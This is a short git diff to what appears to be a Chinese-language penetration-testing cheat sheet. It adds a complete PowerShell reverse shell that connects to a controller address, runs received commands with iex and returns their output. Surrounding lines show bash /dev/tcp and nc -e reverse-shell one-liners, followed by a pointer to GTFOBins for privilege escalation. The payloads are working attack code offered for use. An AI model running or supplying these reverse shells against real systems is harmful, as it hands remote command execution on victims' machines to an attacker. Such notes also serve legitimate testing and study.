@@ -707,6 +707,22 @@ bash -i >& /dev/tcp/ip/port 0>&1  # 简单方便。需要bash和dev权限
 nc -e /bin/bash ip port           # 需要目标安装了nc
 ```
 
+Powershell
+
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient($control_ip, $control_port);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex ". { $data } 2>&1" | Out-String );
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()
+};
+$client.Close()
+```
+
 ## 提权
 
 [GTFOBins](https://gtfobins.github.io/)收录了许多用Linux指令绕过操作系统安全策略的方法
